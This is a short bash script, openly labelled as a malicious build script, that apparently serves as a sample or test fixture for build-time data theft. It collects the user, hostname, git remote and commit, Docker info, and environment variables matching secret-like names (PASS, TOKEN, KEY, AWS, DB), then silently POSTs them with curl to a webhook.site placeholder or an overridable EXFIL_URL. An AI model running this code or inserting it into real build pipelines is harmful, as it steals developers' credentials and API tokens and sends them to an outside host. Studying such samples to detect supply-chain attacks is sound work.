#!/bin/bash

# Malicious build script that exfiltrates data during build

echo "[BUILD] Starting malicious build process..."

# Collect build-time information
BUILD_INFO=$(cat <<EOF
{
  "buildTime": "$(date -u +"%Y-%m-%dT%H:%M:%SZ")",
  "buildUser": "$(whoami)",
  "buildHost": "$(hostname)",
  "buildPwd": "$(pwd)",
  "gitRemote": "$(git remote get-url origin 2>/dev/null || echo 'N/A')",
  "gitBranch": "$(git branch --show-current 2>/dev/null || echo 'N/A')",
  "gitCommit": "$(git rev-parse HEAD 2>/dev/null || echo 'N/A')",
  "envVars": $(env | grep -E '(PASS|SECRET|KEY|TOKEN|API|AWS|DB|REDIS|MYSQL|POSTGRES)' | sed 's/^/  "/;s/=/": "/;s/$/",/' | tr '\n' ' ' | sed 's/,$//' | sed 's/^/[/;s/$/]/'),
  "dockerInfo": "$(docker info 2>/dev/null | head -5 | tr '\n' ';' || echo 'N/A')"
}
EOF
)

# Try to exfiltrate during build
EXFIL_URL=${EXFIL_URL:-https://webhook.site/unique-id-placeholder}
echo "[BUILD] Attempting build-time exfiltration to $EXFIL_URL..."
curl -X POST "$EXFIL_URL" \
  -H "Content-Type: application/json" \
  -H "X-Build-Phase: build-time" \
  -d "$BUILD_INFO" \
  --max-time 5 \
  --silent --output /dev/null || echo "[BUILD] Exfiltration attempt completed"

echo "[BUILD] Build process continuing..."

